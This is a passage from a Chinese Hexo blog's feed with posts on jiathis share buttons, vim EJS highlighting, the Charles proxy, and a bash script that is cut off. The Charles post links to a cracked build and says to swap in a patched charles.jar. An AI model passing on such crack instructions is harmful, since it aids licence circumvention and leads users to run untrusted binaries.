href="http://www.jiathis.com/">jiathis网站</a>，完成注册。<br>进入账号设置，在基本资料栏可以获取用户ID：2084038。</p><h3 id="2-主题配置"><a href="#2-主题配置" class="headerlink" title="2. 主题配置"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#### Share button</span><br><span class="line">jiathis:</span><br><span class="line">  enable: true ## if you use jiathis as your share tool,the built-in share tool won&#x27;t be display.</span><br><span class="line">  id: 2084038   ## e.g. 1889330 your jiathis ID.</span><br><span class="line">  tsina: 1873363984 ## e.g. 2176287895 Your weibo id,It will be used in share button.</span><br></pre></td></tr></table></figure><p><strong>注</strong>：enable, id, tsina前有二个空格(表示层级关系)，在代码里，可能通过theme.jiathis.enable获取其值。</p><h3 id="3-代码逻辑"><a href="#3-代码逻辑" class="headerlink" title="3. 代码逻辑"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p><p>jiathis分享相关代码逻辑：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if(theme.jiathis.enable)&#123; %&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;share-jiathis&quot;</span>&gt;</span></span><br><span class="line">  &lt;%- partial(&#x27;jiathis&#x27;) %&gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;% &#125; else &#123; %&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">data-url</span>=<span class="string">&quot;&lt;%- item.permalink %&gt;&quot;</span> <span class="attr">data-title</span>=<span class="string">&quot;&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;&quot;</span> <span class="attr">data-tsina</span>=<span class="string">&quot;&lt;%= theme.author.tsina %&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;share clearfix&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p><strong>注</strong>：<code>&lt;%- partial(&#39;jiathis&#39;) %&gt;</code>语法表示加载当前目录下的jiathis.ejs文件。</p><h3 id="4-调整分享按钮顺序"><a href="#4-调整分享按钮顺序" class="headerlink" title="4. 调整分享按钮顺序"></a>4. 调整分享按钮顺序</h3><p>代码：themes/jacman/layout/_partial/post/jiathis.ejs</p><p>调整后的顺序：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_style_24x24&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_button_cqq&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_button_qzone&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_button_weixin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_button_tsina&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_button_renren&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.jiathis.com/share&quot;</span> <span class="attr">class</span>=<span class="string">&quot;jiathis jiathis_txt jtico jtico_jiathis&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;jiathis_counter_style&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三、分享效果展示"><a href="#三、分享效果展示" class="headerlink" title="三、分享效果展示"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share.png" alt="jiathis分享"></p><p>内容分享给QQ好友：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-qq.png" alt="分享给QQ好友"></p><p>内容分享到微博：<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-jiathis-share-weibo.png" alt="分享到微博"></p><h2 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h2><h3 id="1-分享内容丰富"><a href="#1-分享内容丰富" class="headerlink" title="1. 分享内容丰富"></a>1. 分享内容丰富</h3><p>jiathis分享最大的一个优点在于主流的社交平台分享的内容更加丰富：描述会带上一部分正方内容，另外会附带上正文中的图片。</p><h3 id="2-累计分享次数统计"><a href="#2-累计分享次数统计" class="headerlink" title="2. 累计分享次数统计"></a>2. 累计分享次数统计</h3><p>较多说分享而言，jiathis多出一个累计分享次数统计功能。<br>较百度分享而言，找了好久才在别人的博客里找到百度分享累计分享次数的代码，未在百度分享网站显目位置有说明介绍。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/hexo.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
    <category term="分享代码" scheme="http://yeshaoting.cn/tags/%E5%88%86%E4%BA%AB%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>vim高亮显示ejs格式内容</title>
    <link href="http://yeshaoting.cn/article/hexo/vim%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BAejs%E6%A0%BC%E5%BC%8F%E5%86%85%E5%AE%B9/"/>
    <id>http://yeshaoting.cn/article/hexo/vim%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BAejs%E6%A0%BC%E5%BC%8F%E5%86%85%E5%AE%B9/</id>
    <published>2016-02-16T03:51:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/ejs.png" title="ejs" class="img-logo img-center" /><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="http://www.embeddedjs.com/">官方介绍</a>如下：</p><blockquote><p>EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.</p></blockquote><h2 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h2><h3 id="方法一-视ejs格式为html格式"><a href="#方法一-视ejs格式为html格式" class="headerlink" title="方法一 视ejs格式为html格式"></a>方法一 视ejs格式为html格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">au BufNewFile,BufRead *.ejs <span class="built_in">set</span> filetype=html</span><br></pre></td></tr></table></figure><p>详细au命令参见：<a href="http://vimcdoc.sourceforge.net/doc/autocmd.html">AUTOCMD</a></p><h3 id="方法二-定制ejs格式语法高亮"><a href="#方法二-定制ejs格式语法高亮" class="headerlink" title="方法二 定制ejs格式语法高亮"></a>方法二 定制ejs格式语法高亮</h3><h4 id="1-下载ejs语法文件"><a href="#1-下载ejs语法文件" class="headerlink" title="1. 下载ejs语法文件"></a>1. 下载ejs语法文件</h4><p>下载ejs.vim文件到~/.vim/syntax/目录。<br>下载地址：<a href="https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim">https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim</a></p><p>文件内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">runtime! syntax/html.vim</span><br><span class="line">unlet b:current_syntax</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Include Java syntax</span></span><br><span class="line"><span class="string">syn include @ejsJavaScript syntax/javascript.vim</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syn region ejsScriptlet matchgroup=ejsTag start=/&lt;%/  keepend end=/%&gt;/ contains=@ejsJavaScript</span></span><br><span class="line"><span class="string">syn region ejsExprmatchgroup=ejsTag start=/&lt;%=/ keepend end=/%&gt;/ contains=@ejsJavaScript</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> Redefine htmlTag so that it can contain jspExpr</span><br><span class="line">syn clear htmlTag</span><br><span class="line">syn region htmlTag start=+&lt;[^/%]+ end=+&gt;+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; syn keyword ejsPrint contained print</span></span><br><span class="line"><span class="string">syn match javaScriptType        /\&lt;\zsvars\ze\./</span></span><br><span class="line"><span class="string">syn match javaScriptSpecial     /\&lt;\zsexports\ze\./</span></span><br><span class="line"><span class="string">syn match javaScriptFunction    /\&lt;\zsprint\ze(/</span></span><br><span class="line"><span class="string">syn match javaScriptFunction    /\&lt;\zsinclude\ze(/</span></span><br><span class="line"><span class="string">syn match javaScriptFunction    /\&lt;\zsincludeObject\ze(/</span></span><br><span class="line"><span class="string">syn match javaScriptFunction    /\&lt;\zsfetch\ze(/</span></span><br><span class="line"><span class="string">syn match javaScriptFunction    /\&lt;\zsfetchObject\ze(/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">command -nargs=+ HiLink hi def link &lt;args&gt;</span></span><br><span class="line"><span class="string">HiLink  ejsTag      htmlTag</span></span><br><span class="line"><span class="string">delcommand HiLink</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">let b:current_syntax = &quot;</span>ejs<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-设置ejs格式语法"><a href="#2-设置ejs格式语法" class="headerlink" title="2. 设置ejs格式语法"></a>2. 设置ejs格式语法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">au BufNewFile,BufRead *.ejs <span class="built_in">set</span> filetype=ejs</span><br></pre></td></tr></table></figure><h2 id="三、参考文档"><a href="#三、参考文档" class="headerlink" title="三、参考文档"></a>三、参考文档</h2><p><a href="http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim">Syntax highlight for .ejs files in vim</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/ejs.png&quot; title=&quot;ejs&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
    <category term="vim" scheme="http://yeshaoting.cn/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>Charles使用手记</title>
    <link href="http://yeshaoting.cn/article/mac/Charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/"/>
    <id>http://yeshaoting.cn/article/mac/Charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/</id>
    <published>2016-02-14T10:55:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/charles.png" class="img-logo img-center" /><h2 id="一、-安装-amp-破解"><a href="#一、-安装-amp-破解" class="headerlink" title="一、 安装&amp;破解"></a>一、 安装&amp;破解</h2><p>官方网站下载原版：<a href="https://www.charlesproxy.com/latest-release/download.do">https://www.charlesproxy.com/latest-release/download.do</a></p><p>破解文件下载：<a href="http://www.typechodev.com/index.php/archives/518/">charles 3.11 mac版 注册码&amp;破解</a><br>适用于Charles3.11.x，含Windows版和Mac版。<br>使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。</p><h2 id="二、设置Wifi热点"><a href="#二、设置Wifi热点" class="headerlink" title="二、设置Wifi热点"></a>二、设置Wifi热点</h2><ol><li><p>在“系统偏好设置”中找到共享，并打开，如下图所示：<br>![共享]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626efeiiiee0ie0de1d.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626efeiiiee0ie0de1d.png</a>)<br>![共享]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626efeiiiee0ie0de1d.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626efeiiiee0ie0de1d.png</a>)</p></li><li><p>设置wifi<br>![设置wifi]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626dfzl5ddirvab0wlf.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626dfzl5ddirvab0wlf.png</a>)<br>![设置wifi]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626dfzl5ddirvab0wlf.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626dfzl5ddirvab0wlf.png</a>)</p></li><li><p>设置互联网共享<br>![互联网共享]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626zltkgqegkdk9egk9.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626zltkgqegkdk9egk9.png</a>)<br>![互联网共享]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626zltkgqegkdk9egk9.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626zltkgqegkdk9egk9.png</a>)</p></li></ol><p>参见：<a href="http://www.macx.cn/thread-2076838-1-1.html">将你的Mac设置为共享的Wifi热点</a></p><span id="more"></span><h2 id="三、代理手机"><a href="#三、代理手机" class="headerlink" title="三、代理手机"></a>三、代理手机</h2><ol><li><p>查看代理ip地址<br>当前IP地址为192.168.155.43，如下图所示：<br>![代理ip]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-local-ip.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-local-ip.png</a>)<br>![代理ip]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-local-ip.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-local-ip.png</a>)</p></li><li><p>打开charles http代理端口<br>打开charles http代理端口，默认端口为8888.<br>![打开charles http代理端口]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-http-setting.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-http-setting.png</a>)<br>![打开charles http代理端口]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-http-setting.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-http-setting.png</a>)</p></li><li><p>手机代理配置<br>![手机代理配置]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-phone.jpg">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-phone.jpg</a>)<br>![手机代理配置]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-phone.jpg">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-phone.jpg</a>)</p></li><li><p>允许手机访问<br>![允许手机访问]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-trust-dialog.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-trust-dialog.png</a>)<br>![允许手机访问]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-trust-dialog.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-trust-dialog.png</a>)</p></li></ol><h2 id="四、抓包"><a href="#四、抓包" class="headerlink" title="四、抓包"></a>四、抓包</h2><p>打开抓包开关：<br>![开始http抓包]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-http-switch.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-http-switch.png</a>)<br>![开始http抓包]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/charles-proxy-http-switch.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/charles-proxy-http-switch.png</a>)</p><p>![charles抓取界面]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/1009004.jpg">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/1009004.jpg</a>)<br>![charles抓取界面]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/1009004.jpg">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/1009004.jpg</a>)</p><p>抓取界面如下图所示：<br>![数据捕获]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/20141130195559531.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/20141130195559531.png</a>)<br>![数据捕获]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/20141130195559531.png">http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/20141130195559531.png</a>)</p><h2 id="五、注意事项"><a href="#五、注意事项" class="headerlink" title="五、注意事项"></a>五、注意事项</h2><ol><li><p>unicode编码<br>抓到的内容里包含的中文一般都使用unicode进行编码，内容形如：\u65e0\u5e26\u88d9\u7684\u9ad8\u96c5\u88c5\u626e，需要自行解码。</p></li><li><p>ssl支持<br>charles对https协议的支持还需要特殊配置一下。<br>需要到官方网站<a href="http://www.charlesproxy.com/documentation/additional/legacy-ssl-proxying/">LEGACY SSL PROXYING页面</a>下载ssl证书，charles应用以及手机上也需要做一些配置。<br>如有需要可参考参考文档里的文章进行配置，本文不做介绍。</p></li></ol><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ol><li><a href="http://www.infoq.com/cn/articles/network-packet-analysis-tool-charles">iOS开发工具——网络封包分析工具Charles</a></li><li><a href="http://drops.wooyun.org/tips/2423">charles使用教程指南</a></li><li><a href="http://blog.csdn.net/jiangwei0910410003/article/details/41620363">Mac上的抓包工具Charles</a></li><li><a href="http://www.gfzj.us/tech/2015/06/24/charles-hacking.html">Charles Web Debugging Proxy Hacking</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/charles.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、-安装-amp-破解&quot;&gt;&lt;a href=&quot;#一、-安装-amp-破解&quot; class=&quot;headerlink&quot; title=&quot;一、 安装&amp;amp;破解&quot;&gt;&lt;/a&gt;一、 安装&amp;amp;破解&lt;/h2&gt;&lt;p&gt;官方网站下载原版：&lt;a href=&quot;https://www.charlesproxy.com/latest-release/download.do&quot;&gt;https://www.charlesproxy.com/latest-release/download.do&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;破解文件下载：&lt;a href=&quot;http://www.typechodev.com/index.php/archives/518/&quot;&gt;charles 3.11 mac版 注册码&amp;amp;破解&lt;/a&gt;&lt;br&gt;适用于Charles3.11.x，含Windows版和Mac版。&lt;br&gt;使用方法：下载并解压后，选择响应平台的charles.jar并替换安装目录下对应的同名文件即可。替换后记得重启Charles哈。&lt;/p&gt;
&lt;h2 id=&quot;二、设置Wifi热点&quot;&gt;&lt;a href=&quot;#二、设置Wifi热点&quot; class=&quot;headerlink&quot; title=&quot;二、设置Wifi热点&quot;&gt;&lt;/a&gt;二、设置Wifi热点&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在“系统偏好设置”中找到共享，并打开，如下图所示：&lt;br&gt;![共享]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626efeiiiee0ie0de1d.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626efeiiiee0ie0de1d.png&lt;/a&gt;)&lt;br&gt;![共享]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626efeiiiee0ie0de1d.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626efeiiiee0ie0de1d.png&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;设置wifi&lt;br&gt;![设置wifi]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626dfzl5ddirvab0wlf.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626dfzl5ddirvab0wlf.png&lt;/a&gt;)&lt;br&gt;![设置wifi]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626dfzl5ddirvab0wlf.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626dfzl5ddirvab0wlf.png&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;设置互联网共享&lt;br&gt;![互联网共享]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626zltkgqegkdk9egk9.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626zltkgqegkdk9egk9.png&lt;/a&gt;)&lt;br&gt;![互联网共享]&lt;a href=&quot;http://o7kubqw1j.bkt.clouddn.com//images/article/charles%E4%BD%BF%E7%94%A8%E6%89%8B%E8%AE%B0/234626zltkgqegkdk9egk9.png&quot;&gt;http://o7kubqw1j.bkt.clouddn.com//images/article/charles使用手记/234626zltkgqegkdk9egk9.png&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参见：&lt;a href=&quot;http://www.macx.cn/thread-2076838-1-1.html&quot;&gt;将你的Mac设置为共享的Wifi热点&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="charles" scheme="http://yeshaoting.cn/tags/charles/"/>
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>文件遍历选取脚本</title>
    <link href="http://yeshaoting.cn/article/shell/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E9%80%89%E5%8F%96%E8%84%9A%E6%9C%AC/"/>
    <id>http://yeshaoting.cn/article/shell/%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E9%80%89%E5%8F%96%E8%84%9A%E6%9C%AC/</id>
    <published>2016-02-01T10:32:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/bash.png" class="img-logo img-center" /><h2 id="一、脚本说明"><a href="#一、脚本说明" class="headerlink" title="一、脚本说明"></a>一、脚本说明</h2><h3 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1. 应用场景"></a>1. 应用场景</h3><p>身为QA的女友，有一堆自动化的测试用例跑，随着自动化case的增加，导致每次回归测试过程时间过长。<br>有些时候上线功能只是修改了某些业务逻辑，仅仅只需要执行一部分case即可。<br>因此，需要从一堆现有case里选取若干文件即可。</p><h3 id="2-脚本内容"><a href="#2-脚本内容" class="headerlink" title="2. 脚本内容"></a>2. 脚本内容</h3><p>脚本主要分为二部分内容：文件遍历和文件选择。</p><p>文件遍历：将指定路径下特定后缀的case选取出来，存入到数组files中，并以序号、数组内容格式输出。<br>文件选择：等待用户输入序号(多个使用空格隔开)，然后根据用户输入的多个序号从数组files中选取对应的文件即可。</p><h2 id="二、选取脚本"><a href="#二、选取脚本" class="headerlink" title="二、选取脚本"></a>二、选取脚本</h2><h3 id="1-脚本源码"><a href="#1-脚本源码" class="headerlink" title="1. 脚本源码"></a>1. 脚本源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">BASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article</span><br><span class="line">FEATURE=<span class="string">&#x27;*.md&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$#</span> -ge 1 &amp;&amp; <span class="variable">$1</span> != <span class="string">&#x27;-&#x27;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">BASE_PATH=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$#</span> -ge 2 